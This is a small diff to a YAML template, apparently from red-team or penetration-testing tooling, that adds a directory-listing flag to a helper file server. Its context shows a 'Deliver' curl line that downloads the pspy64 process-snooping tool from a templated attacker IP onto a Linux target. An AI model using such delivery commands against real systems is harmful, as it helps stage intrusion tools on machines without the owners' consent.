@@ -11,4 +11,4 @@ content: |
   echo '                       -----Linux------                         '; \
   echo 'Deliver: curl http://{{ attacker_ip }}:{{ delivery_outbound_port }}/pspy64 -o {{ delivery_path_linux }}/pspy64'; \
   echo '================================================================'; \
-  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
+  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound {{ delivery_dir_listing_flag }}
